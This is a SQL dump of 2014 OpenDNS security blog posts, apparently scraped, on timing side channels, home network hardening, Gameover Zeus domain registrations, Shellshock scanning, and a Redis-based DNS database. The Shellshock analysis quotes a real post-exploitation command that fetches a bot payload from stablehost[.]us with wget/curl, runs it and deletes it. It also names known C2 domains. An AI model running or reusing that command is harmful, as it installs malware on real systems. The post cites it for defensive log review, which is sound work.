off and hit enter.\n(thanks to @maxrmp for the Windows recommendations)\nHistory of shell commands\nOn UNIX systems, interactive shells are often configured to store all the commands that have been typed into files named ~/.zsh_history (zsh), ~/.bash_history (bash) or ~/.sh_history (ksh).\nDo these commands include confidential data? Then definitely can, especially since applications accepting passwords on the command-line are fairly common. The OpenSSL command-line tool, the ssh-keygen command and the MySQL client are some common examples of tools where important passwords can be given on the command-line, and a copy of these passwords eventually get recorded into the history shell commands.\nSome shells such as Zsh allow fine-grained control over what should be recorded. Most shells will not record a command stating with a space character. However, on a production system, there is usually no reason to persist the shell history to disk.\nOS-Level mitigations\nReplace the ~/.zsh_history, ~/.bash_history and ~/.sh_history files with a symbolic link to /dev/null.\nAlternatively, set the SAVEHIST environment variable to 0.\nSide-channel information leakage\nSide-channels attacks extract sensitive data from information leaked by implementations processing them.\nPerhaps the most common side-channel is caused by non-constant time comparisons of passwords and secret keys:\nif user_entered_password == stored_password:\n    allow_access()\nelse:\n    disallow_access()\nThis is how Python actually performs the strings comparison:\nif (Py_SIZE(a) == Py_SIZE(b) &&\n        a->ob_sval[0] == b->ob_sval[0] &&\n        memcmp(a->ob_sval, b->ob_sval, Py_SIZE(a)) == 0) {\n        result = Py_True;\n    } else {\n        result = Py_False;\n    }\nIf the strings do not have the same length, the function directly returns False without any further processing. The first character is compared next. If it is not the same in both strings, the function doesn’t perform any further comparisons and returns False. Eventually, the memcmp() function is called in order to compare the the entire string.\nHere is an implementation of this function (OpenBSD/amd64):\n\n    int memcmp(const void s1, const void *s2, size_t n)\n    {\n        if (n != 0) {\n            const unsigned char *p1 = s1, *p2 = s2;\n            do {\n                if (p1++ != p2++)\n                    return (--p1 - *--p2);\n            } while (--n != 0);\n        }\n        return (0);\n    }\nBytes are compared one by one, and the function returns as soon as one\ndifference is found.\nAs a result:\nTiming differences can be observed when comparing two strings of the same length (no matter what their content is) and when comparing strings of different lengths.\n\n\nNo matter what the memcmp() implementation is, timing differences can be observed when the first character of two strings is identical and when it is not.\n\n\nTiming differences can be observed according to the longest common prefix shared by two strings being compared.\nThese timing differences can be used to extract sensitive data such as private keys, locally and remotely. While timing differences are particularly visible in Python and Java, all programming languages behave in a similar way, for obvious performance purposes.\nA common misconception is that these timing differences are not exploitable due to jitter introduced by the network and by other system activities. However, it has been demonstrated that with enough samples, and by calculating the difference between peaks combined with a percentile range filter, very small differences could still be exploited regardless of the noise. Timing attacks have been successfully used in many scenarios such as extracting private keys from HTTP servers and unlocking the XBOX 360.\nAs we are shifting from dedicated servers to virtualized environments, side-channel attacks should be taken more and more seriously. In particular, CPUs are usually shared by all the processes no matter which container or virtual machine they run in.\nBranch prediction and shared caches can be abused by a process to learn about what kind of operations another process is performing. In 2005, Percival published a concerning paper on how the “Hyper-Threading” feature of modern Intel CPUs and shared L1 caches can be used to steal secret keys from another process. This attack is still relevant today, even when the processes are running in different containers.\nMore recently, Apecechea, Inci, Eisenbarth and Sunar demonstrated that cross-VM attacks are possible. Their clever attack was conducted on VMWare, as well as the Xen hypervisor used by many virtual machines providers such as Amazon (EC2).\nIn a previous study, Ristenpart, Tromer, Shacham and Savage showed that with little effort and money, an attacker can get an instance assigned to the same physical machine as the target.\nThese attacks remain fairly difficult to conduct, but considering the level of sophistication of some targeted cyber espionage operations we have seen in the past, they should definitely not be ignored.\nMitigating side-channel information leakage\nAlthough it is not the only side channel that can be exploited, we focused on timing attacks because these are the most practical attacks without physical access. Resisting side-channel attacks is difficult. Ideally, applications should never access specific memory locations or do conditional jumps based on sensitive data.\nEven cryptographic libraries are not completely immune to side-channel attacks. Numerous timing side channels have been found in major TLS implementations, such as in the recent Lucky 13 attack by Paterson and Al Fardan.\nFor applications processing sensitive data:\nFavor bare-metal, dedicated servers over shared virtual machines.\n\n\nDisable HyperThreading.\n\n\nUse Hardware Security Modules. This is even an option on Amazon EC2.\n\n\nDo not write your own crypto and make sure that the libraries you are using are always up-to-date.', 'Malware;Security Community;Security Research', 'https://umbrella.cisco.com/blog/2014/10/09/hardening-infrastructure-mitigate-leaks-sensitive-data/');

As you know, our service helps users connect with confidence on any device, anywhere, anytime. However, there’s more you can do to protect your home networks—for example, securing the very devices you use to connect to the Internet. Some examples of devices on your network environment include modems, routers, and computers.\nIn this post, we’ll focus on explaining your network environment, and then provide some tips on how to secure it.\n\nUnderstanding Your Network Environment\nLet’s start by finding out more about the devices you use to connect to the Internet. Here’s a quick list of questions that should give us all the information we need:\nWhat is the make, model, and version of the modem or router provided by your Internet Service Provider (ISP)?\nKnowing the make, model, and version of your modem or router will not only help you understand the device’s features and limitations, but will also help you properly secure it! Check the body of the device or read the manual to find this information.\nWhat are the IP address and login credentials for your modem or router?\nMost modems and routers will have the default login information and IP address printed on the body. The modem or modem-router combination that your ISP provides is what we call the gateway or edge device. A gateway or edge device is networking device which handles communication from your network to the outside world. Settings on this device will dictate how the rest of your network behaves.\nHow is your network connected to the Internet?\nYou should map out your network environment with topology software. Just kidding! It’s not necessary for you to go that far, but a basic understanding of which devices connect to what can be very helpful. A simple map structure of your network can come in handy when locating and troubleshooting a network problem.\nTo get you started, here’s a basic home network map:\n\nFinally, remember to note the various types of devices on your network.\nA modem is not exactly the same as a combination modem-router, and each will handle your network traffic in a unique way.\nThere are many online resources that can help you understand your network devices. To get you started, here’s a video explaining the difference between a hub, a switch, and a router.\n\nTips to Secure Your Network Environment\nNow that you have a better understanding of your home network, here are a few simple steps you can take to minimize unauthorized access. (Of course, by using OpenDNS, you’ve already added an extra layer of security!)\nChange the login credentials on your gateway device and router.\nAs mentioned previously, most modems and routers have default login credentials that make initial configuration easy. After the initial setup, change the username (if possible) and password to prevent unauthorized access to your modem or router. There are many online resources that provide a list of default login credentials for modems and routers, which can be used to easily compromise your network.\nKeep your operating system and router updated.\nMost vulnerabilities are exploited due to outdated software and/or firmware. Running the latest operating system and router firmware helps protect your network against intrusion.\nHave a network use policy for your home.\nIt is easy to overlook this point, but it is critical to have a set of protocols (pun intended) that everyone should follow. For example, one of our rules at home is “don’t click on suspicious links.” What are suspicious links? See how well you can spot a phishing site with our quiz.\nCreate separate guest networks for visitors.\nTypically, if you have a Wi-Fi network and users connect to the same access point, those users are a part of and have access to your network. Isolating guest users helps prevent access to your local network resources. Many home routers have this feature, but it has to be enabled. Please consult your router’s manual on how to configure separate guest network.\nDisable your router’s remote login feature.\nMany routers allow you to remotely log in to your home machine and network, but this makes your network vulnerable to attacks. Disabling the remote login feature will prevent others who are not directly connected to your router from accessing it.\nStay up-to-date on technology news about your network devices.\nKeeping up with the latest news about online threats that target devices on your network, sometimes region specific, can help you take necessary actions to either prevent your system from being compromised or find solutions for an already affected system. There are many websites, blogs, and forums dedicated to each of the devices you use to get online. If you prefer short updates, you can sign up for news updates or follow like-minded individuals or groups on their social media sites. Lastly, be aware of changes in your network environment. If you notice that your connection speed has slowed down significantly, or if your machine is running slower than usual, these are signs that something is amiss and needs to be checked.\n\nBy no means is this a definitive guide on home networking. However, having a grasp of how your network is set up and applying basic security measures will not only help you troubleshoot your home network problems, but they will also minimize malicious users from gaining access to your network.

INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1477, 'Gameover Zeus Registration Deep Dive', 'Anthony Kasza', 'October 8, 2014', 'The Data\nAs described in previous bloggings by our very own Dhia, the Gameover Zeus malware has had two known variants, commonly referred to as oldGOZ and newGOZ. Both versions use an algorithm seeded on time to dynamically generate domains to contact for instructions. In this post, we dig deeper into newGOZ’s domain registration history and query volumes to identify patterns.\nThrough query co-occurrence and the predictability of the malware’s DGA we were able to collect a sample data set of domains belonging to newGOZ, which were registered between August 1 and September 20. For each domain in the set, registration times and query spike times were collected. The registration time of a domain is the hour when a domain was registered while the query spike time is when OpenDNS first saw an increase in the rate of queries being sent to our resolvers. Below is an image that demonstrates the query spike of one newGOZ domain, i7p1t11cgk79x1nl3qbrbrydhm|.|com.\n\nThis domain’s query spike time was at 22:00 on 9/9/2014, while the registration time was at 13:44 on 9/9/2014. Subtracting the registration time form the query spike time, a delta is calculated. In this case, the registration to query spike delta is negative -8.266389 hours. Each domain and delta in the data set was also given an artificial feature of one to simulate a two-dimensional space appropriate for graphing. Whois data was then added to the data set including: the email address used to register the domain, the name of the registrant, the physical address of the registrant, and the registrar used to register the domain. Unfortunately, not all registration information was available and some values had to be set to ‘none’.\nExploring the Data\n\nWhile manually inspecting (using unique, sorts, etc.) the email addresses used to register the domains we observed many email addresses which are known to belong to security research community members. Domains corresponding to these researchers were removed from the data. Many of the email addresses belonged to proxy registration services. These email addresses may also belong to members of the research community, but cannot be confirmed and were left in the data set (if you registered a newGOZ domain through a privacy protection service feel free to let me know). The newGOZ domain deltas were then plotted in R and are shown below.\nThe majority of domains had negative delta values, indicating they were registered before a query spike occurred. This makes logical sense as registrants are likely interested in owning the domain during the spike time, and thus receiving the largest amount of traffic to their domain. Many of the domains also had a delta very close to zero. This indicates the registration time and query spike time are very close to each other. The following graph is the same data as figure 2, but with the data points replaced by the email address used to register the domain.\n\nA window of plus and minus 25 hours was created around the zero delta value and removed. All domains which fell within this windows were registered 25 hours before or after queries for them spiked. The following graph is the same data as figure 3 with the +/-25 hour window of domains removed, only showing domains registered more than 25 hours before or more than 25 hours after the domain’s queries spiked.\n\n\nClustering the Data\nInstead of relying on an arbitrary threshold of 25 hours to categorize the domains’ deltas, we applied (using the fpc package for R) the DBSCAN algorithm on the deltas and the artificial feature. This unsupervised machine-learning algorithm was able to identify clusters of similar deltas based on their density. The graph below is the same data as figure 3, with colors representing the clusters DBSCAN identified while using an Euclidean distance of 75 minutes and a minimum cluster size of 3.\n\nCluster 0 is what DBSCAN identified as noise. Eliminating the clusters and plotting only the noise would result in a graph very similar to that of figure 4. Using DBSCAN instead of trusting my analyst’s intuition made me feel better because it involved math.\nExploring the Clusters\nAfter removing the noise from figure 5, a more focused plot can be created. The graph below shows the clusters DBSCAN identified more closely.\n\nThe cluster identified seem to represent domains registered before the query spikes, just as the query spikes are occurring and after the query spikes. Mapping these clusters to the registrars used by each cluster, the below graph was generated.\n\nEnriching the Clusters\nUsing the recently released OpenGraphiti engine, we built and visualized a semantic network of registration information for both domains belonging to cluster and for domains considered noise. In the case of the domain using a proxy registration service, the domain was not considered. First, the newGOZ domain registrant email addresses were taken from the data set. Then, all the domains registered with those email addresses as registrant email addresses (including ones that were not part of the newGOZ DGA) were identified. Lastly, the registrant name and physical address were added to the data set. The first graph below shows the registrants of the noise domains not using a proxy registration service.\n\nFrom left to right the node types are, registrar, domain name, registrant email address, registrant name, and registrant physical address. The registrant email addresses of these noise domains map to single registrant names (which map to single registrant physical addresses). Each registrant has one name and each email address belongs to one person.\nInspecting registration information of the domains belonging to clusters identified by DBSCAN (again ignoring proxy registrations), it seems registrants have much less consistent identities. While registrant name to physical addresses remained a 1:1 ratio, name to email address relationships were found to be 1:1, many-to-one, and one-to-many. These email and name sharing relationships between the registrants of cluster domains is shown below.\n\nThe node types depicted above take the same structure as figure 8 where nodes (from left to right) represent the registrar used, the newGOZ domain, the email address used by the registrant, the registrant’s name and the physical address of the registrant.\nPutting It All Together\nMy intuition tells me that patterns in registration to query spike time do not generally occur in non-DGA co-occurring domains, but we have yet to prove this theory. In the case of newGOZ we were able to identify a distinct pattern in registration information of domains with significant (clusters) registration to query spike time deltas that was not present in the registration information of domains with registration to query spike time deltas considered noise. We will keep you posted as we further investigate this pattern.', 'Malware;Security Graph;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2014/10/08/gameover-zeus-registration-deep-dive/');

OpenDNS Security Labs thought long and hard about how we would respond and decided that, in the best interest of the security community, we wouldn’t simply rehash what everyone else was saying. Instead, we decided to look at the queries made on our global infrastructure to see what observations could be made.\nFor background on the Shellshock vulnerability we recommend visiting:\n\n\n/2014/09/26/bash-shellshock-security-need-know/\nhttp://www.csoonline.com/article/2688716/vulnerabilities/attacks-against-shellshock-continue-as-updated-patches-hit-the-web.html\nhttp://threatpost.com/bash-exploit-reported-first-round-of-patches-incomplete/108550\nThe Data\nWith the help of numerous sources, including our friends at AlienVault, ThreatStream, and Akamai in addition to individuals such as @lbhuston, @achillean, @dkulshitsky, and @nickschroedl, among others, we were able to compile a list of Shellshock scanning IP addresses. This list, which can be found here, contains 1060 unique IP addresses, at the time this blog post was written, from countries all over the world.\nAs we began to look at the data, a question materialized: how many of these scans were from researchers vs. malicious actors…and how could we find out?\nTo begin with, we looked at the IP addresses from our scan data set and determined the ASN, CIDR, geographic location, and AS owners for each scanner IP. An IP-based geolocation map was generated and can be seen below.\n\nLooking at the scanning IP country of origin, the chart shown below represents the top talking countries, by ASN, with more than 10 identified IP-to-ASN mappings. As you can see, the majority of scans originated from France, Germany, The Netherlands, Italy, China, Great Britain, and the United States, in ascending order.\n\nFor those scanning countries with fewer than 10 scans, there is a much more level count of scans-per-country.\n\nJust hours after this vulnerability was reported, Perl Shellbot and bash injected ELF malware was seen in the wild.\nAside from researchers scanning the entire Internet (looking at you @achillean and @ErrataRob), hobbyists, and script kiddies, we observed a huge surge in connections to two IRC servers with hardcoded discovered in several Perl Shellbot samples we (along with others) found on Pastebin.com. These IRC servers, us[.]bot[.]nu and fbi[.]bot[.]nu, are profiled below, as is another malicious payload downloader site.\nAnalysis – us[.]bot[.]nu\n\nBetween September 25th, 2014 and October 2nd, 2014 we observed more than 3.2 million queries for this domain on our infrastructure, with the highest peak (602,295) occurring on September 27th at 01:00 UTC.\n\nAnalysis – fbi[.]bot[.]nu\n\nBetween September 25th, 2014 and October 2nd, 2014 we observed more than 2.5 million queries for this domain, with the highest peak (410,651) occurring on September 27th at 01:00 UTC.\n\nAnalysis – Stablehost[.]us\nA third domain has also been observed as a payload delivery downloader site after the Shellshock vulnerability is detected. This site, stablehost[.]us was known to, and blocked by, OpenDNS back in January, 2014 as it had been used to deliver the Fiesta exploit kit – and now appears to be repurposed for payload delivery.\n\n\n\nThe following string was observed by numerous researchers and security professionals across various perimeter security controls. The command is essentially fetching and running another payload as part of its post-exploitation campaign:\n/bin/bash -c ”wget http://stablehost[.]us/bots/regular.bot -O /tmp/sh;curl -o /tmp/sh http://stablehost.us/bots/regular.bot ; sh /tmp/sh;rm -rf /tmp/sh\nBased on the sustained 1K query count, this is likely a string you should start reviewing your logs for.\nFurther Analysis\nWith all of that data, can we differentiate between researchers, script kiddies, and bots? The first two (researchers and script kiddies) are by far the most difficult to differentiate between <pause for laughter>. Let’s look at more findings and see…\nLooking at day over day changes in activities between users who had been probing for the vulnerability on September 29th vs the 30th, there 118 more users on the 30th than on the 29th. Despite this sudden uptick in users what was more interesting was traffic patterns between the two groups. More than 90% of the new Shellshock probers visited less than three suspicious websites. However, individuals on the 29th who had visited malware continued to visit malware on the same rate on the 30th. In fact, the malware rates and sites visited were almost identical with a deviation of +/- 2. One guess could be that the surge in new probers could be a either security researchers or script kiddies. The users on the 29th who were probing, and had high malware visitation rates, were probably already compromised machines.\nInterestingly – only one malicious domain was found common across each of the three datasets. The advombat[.]ru domain was found once in the Stablehost dataset and three times in both the September 29th and September 30th datasets. The advombat domain is connected with ransomware downloads and, viewing a query history over the past one month, reveals that the domain receives approximately 15k queries per hour with traffic activity following a diurnal pattern. This sort of behavior supports the hypothesis that machines probing for the Shellshock vulnerability on the 29th were part of a larger compromised network. A point of further investigation would be to analyze similarities in traffic between computers that have visited advombat domain.\nThe stablehost[.]us dataset provided us with data regarding computers that were becoming part of a larger Shellshock botnet. The most frequently found domain found across the set of 18 IPs was stabehost[.]us with 17 occurrences. The second most common was linksys[.]secureshellz[.]net. with 8 occurrences.\n\nSecureshellz has been identified by researchers such as our friends over at @MalwareMustDie as one of the C2 centers for the Shellshock botnet. It was also previously known, and blocked, for serving the Fiesta Exploit Kit at the beginning of January, 2014.\nIn closing…\nSo it seems that looking at the data as we’ve done thus far hasn’t really afforded us the visibility into the bot vs. human vs. infected human differentiation problem. OpenDNS Labs will continue to explore this in an upcoming blog post as we have some interesting ideas on how to attack this particular problem.', 'Incident Response;Security Research', 'https://umbrella.cisco.com/blog/2014/10/02/opendns-and-bash/');

For larger projects (or those that are a little trickier) we’ll use an awesome brainstorming method we adapted from the web-team offsite we had in June. This works really well for us, and is how we came to the new homepage redesign!\nThe process is essentially broken into 3 stages and makes use of rapid-fire thinking (and lots of sticky-notes). First stage is the “blue-sky” ideation stage—this is where we write down any possible idea that comes to mind, no matter how crazy or wild it may be. Next we bring it down into the “realist” phase, where we reorganize, prioritize, and hone in on the more solid ideas. Finally comes the last stage, where we “shoot holes” in the ideas we’ve come up with so far. This is where we determine which ideas survived the process, and which ones we should take action on.\nWhy was it important to redesign the Resources section?\nSK: All of our design decisions are based off of a set of user mental model questions we derive from internal and external surveys. The goal is to define these questions, then build a design to answer them.\nPreviously, the Resources section was split up into a series of pages based on the format of the resource. For example, we had a page dedicated to White Papers, a page for Datasheets, for Infographics, and so on and so forth. We discovered that this method of displaying information wasn’t in line with what our users needed. From a UX standpoint, visitors weren’t interested in searching for a resource by its format. What they’re looking for is a resource related to the topic of their need, or relevant role—regardless of the format.\nIn light of this information, what changed in the redesign?\nSK: With this in mind, the multiple-page setup that we had seen before was put aside to make way for a new, dynamic one-page approach to the Resource section.  This approach would make for a smoother overall experience—allowing the user to quickly identify with one of the 3 user types listed (Security Practitioner, IT Professional, or MSP), scan through a nice selection of topics, and select a format.\nHow did the team decide on the one-page design?\nSK: Well once the decision was made to eliminate the page-per-format structure, it only made sense to move to a one-page design.  It was a simple solution to a more complex problem.\nAs for the visual design of the page, we wanted to keep things nice and light—easy to use. As the resources themselves are so rich in content, our aim was to keep the design simple and minimal. The user shouldn’t have to think too hard before diving in. With a one-page design, they could put their focus into consuming our wonderful resources, such as the brand new case studies we just released.\nWhat’s the best new feature of the section?\nSK: Hands-down, the best new feature is the filtering mechanism. It’s clean and functions smoothly. It is now much easier to find what you need! I personally think it’s fun to use as well, which is always an added bonus.\nAnother aspect I really like is the little orange “Premium” icon.  It adds a slight pop of color to the page, but most importantly it marks the content that is gated (requiring the user’s contact information). This addition to the page manages our users’ expectations from the get-go, which is a UX win.\nWhat do you hope users will get out of the redesign?\nSK: A more fluid experience! We have such valuable resources to consume, the goal is to give the users a more intuitive path to reach these resources. I am sure our visitors (and in turn, our company) will benefit from the section getting a much-needed facelift!', 'Announcements;Blog', 'https://umbrella.cisco.com/blog/2014/10/02/renewed-resources/');
INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1480, 'Redesigning Our DNS Database for Low Latency', 'OpenDNS Security Research', 'October 1, 2014', '2 years ago, when we started studying how DNS records could be used to discover malicious activity, we needed a way to quickly access current and historical data.\n3rd party solutions were too slow and too limited to implement Kopis, the very first model we wanted to try.\nThe logs collected by the resolvers were already copied to HDFS for long-term storage, so a simple way to quickly retrieve records based on a DNS name or associated data was to store additional copies in HBase.\nThe system turned out to be still too slow to automatically label new domains, but it was good enough to compute an informative reputation score for a specific domain when a user requested it. Thus, the “Security Graph” was born.\n\nA closer look at how the log files are processed\nUnlike passive DNS systems, packets are not captured by a dedicated process, but directly written by the resolvers to local log files.\n\nThis architecture was easy to build over the existing stack. The number of hops and the late parsing/verification/deduplication stage do not add too much latency: 92% of the records are visible in the ZeroMQ stream less than 30 seconds after related packets have been logged by a resolver.\nThe purpose of the first staging area is to unload the log files from the resolvers as soon as possible, if only because their local storage space is quite limited. This first staging area is also used to export multiple copies of the log files for different purposes.\nThe second staging area is actually our main research server, where raw DNS packets are decoded, parsed, verified and deduplicated.\n\nCan a minimal change to the system drastically reduce the latency?\nAs an alternative to the logfile/rsync/logfile/rsync/logfile pipe, we implemented the ability for the resolvers to serve the logs over a simple ZeroMQ socket. Clients can directly connect to the resolvers and retrieve the data as a feed. This greatly simplifies the architecture, lifts the limitations of on-disk storage and cuts the latency down to a few milliseconds.\nThis is a big win for our models using only the real-time feed. Not so much for manual investigations and for running graph algorithms.\nHBase is a great solution to many problems, but is not a silver bullet. On our constantly overloaded research platform, insertions have to happen in batch, and can only keep up with the data from a small subset of the our resolvers. The latency of read operations is also too high to interactively run graph algorithms.\nIn addition, our original experiments with generic reputation systems (RIP score, J-Score, SecureRank, C-Rank, Dorothy, Co-occurrences) were implemented as Map/Reduce jobs. These can only run on a small subset of old data, and take nearly 24 hours to complete.\nFor this reason, they provide little value for discovering and blocking malicious domains before it’s too late. DNS names used by malware are often active only for a few hours or even just for a few minutes.\nOur typical workflow involves looking for specific patterns in the authoritative logs stream, monitoring suspicious IP addresses, and milking compromised sites and dedicated rotators. We then want to manually review our findings before blocking or sinkholing them.\nMore often than not, a query to our database doesn’t return anything. The traffic is displayed as nonexistent, no IP addresses are shown, so no reputation indicators can be displayed either.\nAt the same time, the DNS name we are investigating actually resolves to a set of IPs that was already associated with many other names with a similar purpose that we just blocked. This information will eventually be available—when we might not need it any more.\nAs a workaround, our API can automatically resolve a name using a dedicated resolve if no records have been found in the database.\nBut by the time we manually look up a name, it might not resolve any more, or we might get different or less records than what was actually observed by our public resolvers.\nUp-to-date data is available, but is still in-transit.\nBuying more hardware is a way to mitigate this issue. But rethinking the system according to how we are actually using it is also an option.\n\nIn-memory storage\nHBase is fast for random I/O. Memory caching systems are faster.\nFor web applications, Memcache is frequently used as a simple caching layer for SQL databases. Would it be worth using the same approach for our DNS database?\nAn initial experiment was conducted using Elliptics Network, mirroring the schema we were already using with HBase.\nIs a pure key/value store the best fit? As it happens, we almost exclusively need to:\n– Retrieve a set of items given a key: list the records for a given name and a given type, list the names mapping to a given server IP, list the recent queries sent by a given client IP.\n– Perform simple operations on sets, such as the intersection of the set of blacklisted names with the names mapping to a given IP.\n– Maintain counters, such as the number of suspicious domains observed on an IP address.\n– Do graph traversals, without requiring excessive network I/O.\n– Perform pattern matching\nBased on these constraints, Redis appeared like a perfect candidate.\nIn order to populate the Redis database, we wrote a daemon that listens to the ZeroMQ stream of authoritative logs, and translates it into Redis queries.\nEach record is indexed twice: once as DNAME|t|QTYPE and once as RR|t|QTYPE``. For example an IPv4 record of127.0.53.53observed forwww.ovh.will be stored in Redis using two different keys:www.ovh.tAand127.0.0.53tA`.\nThe actual value for these records are Redis sets. This is a compact data structure, and no extra deduplication effort is thus necessary. No range queries are required in order to retrieve records and names given a key. Unions and intersections can be directly handled by Redis. This makes common operations such as “what are the list of distinct names mapping to this list of IPs that we are not blocking yet” a very simple and efficient operation.\nKeys are set to expire 24 hours after their most recent update. HBase is not going anywhere and remains where historical data is being stored. However, the API our tools rely on in order to access the DNS database now transparently sends queries both to Redis and to HBase, and merges the results.\nClients get the best of both worlds: historical data with a timeline, as well as fresh data just logged by the resolvers.\n\nLive reputation scores\nRedis also offers a very interesting data structure that we previously blogged about: HyperLogLog.\nHyperLogLog is incredibly useful to estimate the cardinality of a set, with very low memory requirements.\nHow about using it to compute reputation scores?\nUsing the same code base, we wrote another daemon listening to the same input stream, and looking for names that were flagged as suspicious, as well as IPs present in the threat intelligence feeds retrieved by MLSec’s Combine tool. Matching (IP, name) pairs are sent to Redis, the key being the IP and the name being possibly added to the related HyperLogLog structure.\nThis provides an IP reputation score that gets updated nearly in real time. This reputation score is based on recent evidences rather than historical, now possibly incorrect data.\nThe key has an expiration of 1 day, but the individual elements of the sets obviously don’t. An IP address being used for malicious purposes will thus get its reputation automatically cleaned up after one day of quarantine. But an IP address being used over a long period of time for malicious activities won’t expire, and will have its reputation getting worse and worse, even if only one malicious name is being observed every day.\nIn order to investigate live campaigns, this reputation system turns out to be a more useful estimator of the “badness” of an IP address than the bayesian average we previously computed using a daily batch process (“RIP score”).\nHow about using the same system to compute prefix and ASN reputation scores?\nThese additional reputation scores were initially implemented to provide additional features to our first classifier. However, they are virtually useless for interactive investigations. Displaying long tables with list of numbers is possibly the worst way to help humans make a decision.\nA single number to label a full /24 or ASN space is also way too coarse. It is a low importance feature that can help a classifier correctly label data with features very similar to examples it was trained with, but low importance features are hard to interpret.\nUsing pipelining, retrieving the value associated to multiple keys in Redis is merely as fast as retrieving the value associated to a single key.\nTherefore, given a reference IP address, we can quickly retrieve the individual reputation of all the IP addresses of the same subnet.\nGiven a DNS name, this makes it easy to show the reputation of not only the IP addresses it resolves to, but also the reputation of the neighborhood for all these addresses.\nA single graph summarizes what we know about a name from an IP-based point of view, using our own labels combined with 37 third-party threat intelligence feeds.\n\n\nPattern matching\nCommon exploit kits, as well as many phishing pages, are trivial to track if the DNS names they use follow an identifiable pattern.\nMost of what we are blocking today is achieved by grepping the log stream for known IP addresses and known name patterns. Discovering new names following a known pattern helps identifying IP addresses dedicated to malicious activities, which in turn, can be used to discover new names to block even if these do not follow the same pattern.\nWhen these names are used by an exploit kit, we sinkhole some of them in order to reconstruct the infection chain. It is not uncommon for a rotator to serve different exploit kits, or to remain operational after the pattern used by the exploit kit changes. We have been milking the same rotator for over a year to follow the evolution of the Nuclear Exploit Kit.\nAfter a pattern change has been detected, we need to scan our DNS database for matching records, validate the pattern, find all the names that we missed, and see if we can use them to constitute a new set of dedicated IP addresses, name servers and registrants to watch and block.\nRedis supports full scans of the key space, with optional pattern matching. While not the fastest operation, it can still scan 45 million keys on a busy server in about 3 minutes without blocking other operations. Looking for ‘paypal‘ returns no less than 1973 names observed during a 24 hours period, most of them smelling really phishy.\n\nRedis as a graph database\nUsing Redis as a graph database is not uncommon: Pinterest are storing their entire follower graph in Redis and opensource projects such as Related also show that Redis can be an option for dynamic graphs.\nThe data we have in Redis is a live view of what happened on the Internet over the past 24 hours, as seen from our 23 points of presence.\nRaw log files only allowed us to look at fractions of the graph retroactively. But the speed of Redis is a game changer: we can now mine and visualize a graph made of live data and hopefully use it identify treats as they are happening.\nBesides being blazing fast, Redis provides two powerful features for achieving this goal: the ability to return random keys (entry points to traverse the graph) and server-side Lua scripting.\n\nBig data, small memory footprint\nAs the the time of writing, the graph representing 24 hours of activity, as well as the IP reputation from 37 threat intelligence feeds in addition to our own system, is made of approximatively 46 million vertices and 174 million edges.\nUsing Redis, this entire graph requires only 21 Gb memory. Compressed dumps do not exceed 4 Gb.\nAnd the current version doesn’t even try to be memory efficient: keys and values are stored as plain ASCII strings. IP addresses would obviously benefit from binary encoding and a simple Huffman coding of DNS names can also significantly reduce the memory footprint.\n\nCaveats\nWith the addition of a single virtual machine to our research infrastructure, we significantly improved its performance and its robustness – the Hadoop cluster being temporarily inaccessible is not critical any more. –\nHowever, Redis has a few peculiarities and limitations to be aware of.\nRedis provides two ways to persist data to disk. With different tradeoffs, but a common requirement: memory pages have to be cloned if they have to be modified while a background save operation is in progress. In our case, virtually all the pages get modified before the dump operation completes, meaning that nearly 42 Gb memory are required to save the database without requiring swapping. As an alternative, we tried Ardb. Unfortunately, the RANDOMKEY operation not being supported was a showstopper.\n\n\nKeys expire, individual set elements don’t. For this reason, IPs observed more than 24 hours ago can remain in a set as long as new IP addresses for the same name are observed. The practical implications are negligible and this can be worked around by tagging each element with a coarse timestamp.\nSimilar to the servers producing the realtime feeds, the servers populating the data into Redis have been written in Rust. Initially, the Redis client library was quite limited, both in term of usability and features. But massive improvements were recently made which resulted in an additional performance boost for our applications.\n\nExciting times\nOur DNS database is unique. By the quality of the data, but also by its features. The realtime feed already allowed watching for specific events and reacting right after a query was received by the OpenDNS resolvers. We now provide the same timeliness and freshness guarantees to ad-hoc queries.\nKeeping the entire graph in memory also opens new perspectives. Reputation systems and classifiers leveraging this can drastically help fighting modern malware, characterized by its agility.', 'Big Data;Security Graph;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2014/10/01/redesigning-dns-database-low-latency/');

Our CEO has excellent relationships with many of them, who currently use our technology and provide us with insights on their own security stance and how we can best support that.\nIn our day-to-day discussions about strategy, I’ve started using the term “the Enterprise of the Future” to represent this target customer segment. To me, this means organizations that fit the following profile:\nThey are aggressively leveraging cloud applications to gain a competitive advantage, so most or all of their data is in the cloud.\nThey use a mix of the latest types of devices (many are primarily Mac shops).\nTheir workforce is highly mobile and/or distributed.\nThese companies have had the luxury of building their IT organization at a time when fantastic new cloud-based technologies are available for them to leverage. They are unencumbered by the need to protect crown jewels (data) behind castle walls (traditional enterprise network perimeters) and as such are able to take a different approach to security.\nLet’s call these types of organizations “startups” for the remainder of this article, even if they’ve been around long enough to make it a misnomer.\nIn contrast, your organization has likely been around longer and/or built up a lot of infrastructure necessary for your business to function and deliver your services. It’s probably challenging for you to adopt this new technology and secure it, but getting a window into how these startups are approaching security could help you look towards your own future and flesh out a strategy to get there.\nSo without further ado, here are five trends I’ve observed after speaking to a number of these types of organizations:\n1) They take a “light touch” approach to security\nThe spirit of this approach is really about creating a partnership between you and your end-users that empowers them to keep themselves safe without punishing them; i.e. by making it difficult to do their jobs or slowing them down while they try to work efficiently.\nWhat this practically means to our startups is:\nNo requirement to VPN when outside the protected corporate network.\nNo heavyweight endpoint software pegging the CPU or hogging memory while attempting to do a multitude of security tasks directly on the device that often impede users from working at their desired pace.\nNo heavyweight proxy-based Web security solutions that can break the end-user Internet experience and requires all traffic to be funneled through a single bottleneck even though 99% of traffic will not be blocked.\nOften, this also means local admin access privileges (gasp!), which can actually make sense given the next point…\n2) The device is expendable; it’s the data & login credentials that need to be protected\nIt’s a common stance within these startups that laptops and mobile devices are just another insecure footprint that are used to connect to the Internet. This is increasingly true thanks to the trend of BYOD (“Bring Your Own Device”) in most organizations.\nWhat this means to our startups is that:\nAll data is located within the chosen cloud services, which negates the need for backups and (to some extent) file/folder encryption.\nIf an incident does occur, it’s faster and easier to wipe the device and re-load a standard image, instead of spending time trying to restore and fix compromised devices.\nThe savings from this approach help these startups focus their resources on incident response, which is the next point to cover…\n3) They are aggressively building out their incident response teams, systems, and data\nEven if these startups have small IT teams, they are investing in and focusing on building out their incident response capabilities. 